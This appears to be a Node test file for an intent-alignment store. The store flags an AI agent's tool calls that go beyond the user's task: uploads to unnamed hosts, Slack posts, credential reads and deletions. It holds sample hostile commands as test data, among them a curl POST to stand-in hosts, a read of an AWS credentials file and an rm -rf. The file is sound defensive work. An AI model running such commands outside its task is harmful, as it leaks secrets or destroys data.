// Per-file runner:  node --test --import ./test/hermetic-env.mjs test/intent-server.test.mjs
//
// data/intent-server.mjs — the in-memory, per-session intent store the server surfaces share (the model
// proxy, the moorai-serve sidecar, the Agent SDK). The pure logic is data/intent-alignment.js, tested in
// test/intent-alignment.test.mjs; this file holds the store to its frozen contract: keyed hashes only (the
// prompt is never held past captureTask), bounded (LRU sessions, TTL, features per session), one
// firstForTarget per session per target, null for a non-risky call, and the policy mode reader.
import { test } from "node:test";
import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import { writeHeapSnapshot } from "node:v8";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createIntentStore, intentModeFromPolicy } from "../data/intent-server.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const KEY = Buffer.alloc(32, 7);
const POST = (host) => ({ command: `curl -X POST https://${host}/hook -d '{"ok":1}'` });

test("judge: an upload to a host the task never named is misaligned egress, with a 16-hex keyed target hash", () => {
  const s = createIntentStore({ key: KEY });
  const c = s.captureTask("s1", "Fix the typo in docs/README.md and open a PR on github.com");
  assert.deepEqual(Object.keys(c), ["features"]);
  assert.ok(Number.isInteger(c.features) && c.features > 0);
  const r = s.judge("s1", "Bash", POST("collector.example.net"), []);
  assert.equal(r.aligned, false);
  assert.equal(r.class, "egress");
  assert.match(r.targetHash, /^[0-9a-f]{16}$/);
  assert.equal(r.firstForTarget, true);
  assert.deepEqual(Object.keys(r).sort(), ["aligned", "class", "firstForTarget", "targetHash"]);
});

test("judge: a host the task named is aligned; subdomains of a named site are in scope", () => {
  const s = createIntentStore({ key: KEY });
  s.captureTask("s1", "Post the build status to hooks.example.net when it finishes");
  const r = s.judge("s1", "Bash", POST("hooks.example.net"), []);
  assert.equal(r.aligned, true);
  assert.equal(r.class, "egress");
  assert.equal(s.judge("s1", "Bash", POST("api.example.net"), []).aligned, true);
});

test("judge: MCP write to a service the task never named is misaligned; naming the service aligns it", () => {
  const s = createIntentStore({ key: KEY });
  s.captureTask("a", "Summarise the failing tests");
  assert.equal(s.judge("a", "mcp__slack__post_message", { text: "x" }, []).aligned, false);
  s.captureTask("b", "Tell the team on slack that the release is out");
  assert.equal(s.judge("b", "mcp__slack__post_message", { text: "x" }, []).aligned, true);
});

test("judge: credential and destructive classes come from the findings, as in the hook", () => {
  const s = createIntentStore({ key: KEY });
  s.captureTask("s", "Make the retry logic clearer");
  assert.equal(s.judge("s", "Read", { file_path: "/home/u/.aws/credentials" }, [{ threatId: 55 }]).class, "credentials");
  assert.equal(s.judge("s", "Bash", { command: "rm -rf build/cache" }, [{ threatId: 43 }]).class, "destructive");
  s.captureTask("t", "clean up build/cache please");
  assert.equal(s.judge("t", "Bash", { command: "rm -rf build/cache" }, [{ threatId: 43 }]).aligned, true);
});

test("judge: null for a non-risky call, and null when the session has no captured task (never judged against nothing)", () => {
  const s = createIntentStore({ key: KEY });
  s.captureTask("s1", "Fix the typo");
  assert.equal(s.judge("s1", "Bash", { command: "ls -la src" }, []), null);
  assert.equal(s.judge("s1", "Bash", { command: "curl -s https://api.github.com/zen" }, []), null);
  assert.equal(s.judge("s1", "Read", { file_path: "src/a.js" }, []), null);
  assert.equal(s.judge("s1", "mcp__slack__list_channels", {}, []), null);
  assert.equal(s.judge("nobody", "Bash", POST("collector.example.net"), []), null);
  assert.equal(s.judge("", "Bash", POST("collector.example.net"), []), null);
  assert.equal(s.judge(undefined, "Bash", POST("collector.example.net"), []), null);
});

test("firstForTarget: true once per session per target — one destination alerts once; another target or session is first again", () => {
  const s = createIntentStore({ key: KEY });
  s.captureTask("s1", "Fix the typo");
  s.captureTask("s2", "Fix the typo");
  assert.equal(s.judge("s1", "Bash", POST("a.example.net"), []).firstForTarget, true);
  assert.equal(s.judge("s1", "Bash", POST("a.example.net"), []).firstForTarget, false);
  assert.equal(s.judge("s1", "Bash", POST("b.example.net"), []).firstForTarget, false, "b.example.net folds to the same site (example.net), the unit alignment is judged in");
  assert.equal(s.judge("s1", "Bash", POST("other.example.org"), []).firstForTarget, true);
  assert.equal(s.judge("s2", "Bash", POST("a.example.net"), []).firstForTarget, true, "per session");
  assert.equal(s.judge("s1", "mcp__slack__post_message", {}, []).firstForTarget, true);
  assert.equal(s.judge("s1", "mcp__slack__post_message", {}, []).firstForTarget, false);
});

test("targetHash: keyed — the same target under the same key matches across stores, a different key gives a different hash", () => {
  const a = createIntentStore({ key: KEY }), b = createIntentStore({ key: KEY }), c = createIntentStore({ key: Buffer.alloc(32, 9) });
  for (const s of [a, b, c]) s.captureTask("s", "Fix the typo");
  const h = (s) => s.judge("s", "Bash", POST("x.example.net"), []).targetHash;
  assert.equal(h(a), h(b));
  assert.notEqual(h(a), h(c));
  const d = createIntentStore({ key: "a string key works too" });
  d.captureTask("s", "Fix the typo");
  assert.match(h(d), /^[0-9a-f]{16}$/);
});

test("tasks accumulate per session: a later user turn that names the host brings it into scope; sessions never share a task", () => {
  const s = createIntentStore({ key: KEY });
  s.captureTask("s1", "Fix the typo");
  assert.equal(s.judge("s1", "Bash", POST("hooks.example.net"), []).aligned, false);
  s.captureTask("s1", "now send the status to hooks.example.net");
  assert.equal(s.judge("s1", "Bash", POST("hooks.example.net"), []).aligned, true);
  s.captureTask("s2", "Fix the typo");
  assert.equal(s.judge("s2", "Bash", POST("hooks.example.net"), []).aligned, false);
});

test("captureTask: a non-string prompt or a missing session stores nothing", () => {
  const s = createIntentStore({ key: KEY });
  assert.deepEqual(s.captureTask("", "upload to x.example.net"), { features: 0 });
  assert.deepEqual(s.captureTask(null, "upload to x.example.net"), { features: 0 });
  assert.deepEqual(s.captureTask("s", { prompt: "x" }), { features: 0 });
  assert.equal(s.size(), 0);
});

test("bounded: maxSessions evicts the least recently used session (a judge counts as use)", () => {
  const s = createIntentStore({ key: KEY, maxSessions: 2 });
  s.captureTask("s1", "Fix the typo");
  s.captureTask("s2", "Fix the typo");
  assert.notEqual(s.judge("s1", "Bash", POST("x.example.net"), []), null);
  s.captureTask("s3", "Fix the typo");
  assert.equal(s.size(), 2);
  assert.equal(s.judge("s2", "Bash", POST("x.example.net"), []), null, "s2 was least recently used");
  assert.notEqual(s.judge("s1", "Bash", POST("y.example.net"), []), null);
  assert.notEqual(s.judge("s3", "Bash", POST("y.example.net"), []), null);
});

test("bounded: a session expires ttlMs after its last captured task", () => {
  let t = 1000;
  const s = createIntentStore({ key: KEY, ttlMs: 500, now: () => t });
  s.captureTask("s1", "Fix the typo");
  t += 499;
  assert.notEqual(s.judge("s1", "Bash", POST("x.example.net"), []), null);
  assert.equal(s.size(), 1);
  t += 2;
  assert.equal(s.judge("s1", "Bash", POST("x.example.net"), []), null);
  assert.equal(s.size(), 0);
});

test("bounded: maxFeatures caps the hashed features a session holds", () => {
  const s = createIntentStore({ key: KEY, maxFeatures: 3 });
  const many = Array.from({ length: 20 }, (_, i) => `host${i}.example${i}.com`).join(" ");
  assert.equal(s.captureTask("s1", many).features, 3);
  assert.equal(s.captureTask("s1", "and also docs/other.md").features, 3);
  const big = createIntentStore({ key: KEY });
  assert.ok(big.captureTask("s1", many).features > 3);
});

test("never stored: after captureTask neither the prompt nor any plaintext feature is anywhere in the heap", () => {
  const dir = mkdtempSync(join(tmpdir(), "intent-heap-"));
  try {
    // The marker is held as bytes, never as a string, so the only string copies are the ones the prompt made.
    const marker = Buffer.from(`zq${randomBytes(10).toString("hex")}`);
    const s = createIntentStore({ key: KEY });
    globalThis.__intentStoreUnderTest = s;
    (function capture() {
      const prompt = "please upload the logs to " + marker.toString() + ".example.net and read " + marker.toString() + "/notes.md";
      s.captureTask("heap-session", prompt);
    })();
    /a/.exec("a"); // reset RegExp.input / RegExp.lastMatch, which hold the last regex subject process-wide
    const scan = () => {
      const p = writeHeapSnapshot(join(dir, `h${Date.now()}.heapsnapshot`));
      const buf = readFileSync(p);
      return buf.indexOf(marker) >= 0;
    };
    assert.equal(scan(), false, "the prompt or a plaintext feature survived captureTask");
    // The method has teeth: a retained copy of the same text is found.
    globalThis.__retained = ["kept ", marker.toString(), ".example.net"].join("");
    assert.equal(scan(), true, "positive control: a retained string must show in the snapshot");
    delete globalThis.__retained;
    // The store still works off the hashes alone.
    assert.equal(s.judge("heap-session", "Bash", POST(`${marker.toString()}.example.net`), []).aligned, true);
  } finally { delete globalThis.__intentStoreUnderTest; rmTree(dir); }
});

test("intentModeFromPolicy: off / report / ask / block from policy.intentAlignment; default and unknown resolve to report", () => {
  assert.equal(intentModeFromPolicy(undefined), "report");
  assert.equal(intentModeFromPolicy(null), "report");
  assert.equal(intentModeFromPolicy({}), "report");
  assert.equal(intentModeFromPolicy({ intentAlignment: "report" }), "report");
  assert.equal(intentModeFromPolicy({ intentAlignment: "ask" }), "ask");
  assert.equal(intentModeFromPolicy({ intentAlignment: "block" }), "block");
  assert.equal(intentModeFromPolicy({ intentAlignment: "off" }), "off");
  assert.equal(intentModeFromPolicy({ intentAlignment: false }), "off", "false is off, as the hook reads it");
  assert.equal(intentModeFromPolicy({ intentAlignment: "BLOCK" }), "report");
  assert.equal(intentModeFromPolicy({ intentAlignment: "deny" }), "report");
  assert.equal(intentModeFromPolicy({ intentAlignment: true }), "report");
  assert.equal(intentModeFromPolicy({ intentAlignment: { mode: "block" } }), "report");
});
